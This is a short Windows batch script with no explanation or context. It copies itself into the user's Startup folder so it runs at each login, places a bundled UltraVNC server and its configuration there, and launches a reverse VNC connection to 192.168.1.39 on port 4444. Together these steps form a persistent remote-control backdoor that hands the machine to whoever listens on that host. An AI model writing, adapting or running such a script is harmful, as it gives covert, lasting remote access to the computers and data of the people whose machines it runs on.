@echo off
set startup_folder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup

REM Copy the batch file itself to the startup folder if it doesn't already exist
if not exist "%startup_folder%\%~nx0" (
  copy "%~f0" "%startup_folder%\"
)

REM Determine the directory where this batch file is located
set script_dir=%~dp0

REM Copy the ultravnc.ini file to the startup folder
if exist "%script_dir%ultravnc.ini" (
  copy "%script_dir%ultravnc.ini" "%startup_folder%\"
)

REM Copy the winvnc.exe file to the startup folder
if exist "%script_dir%winvnc.exe" (
  copy "%script_dir%winvnc.exe" "%startup_folder%\"
)

Start winvnc.exe
start "%startup_folder%\winvnc.exe" -run
timeout /t 1 >nul
start "%startup_folder%\winvnc.exe" -connect 192.168.1.39::4444
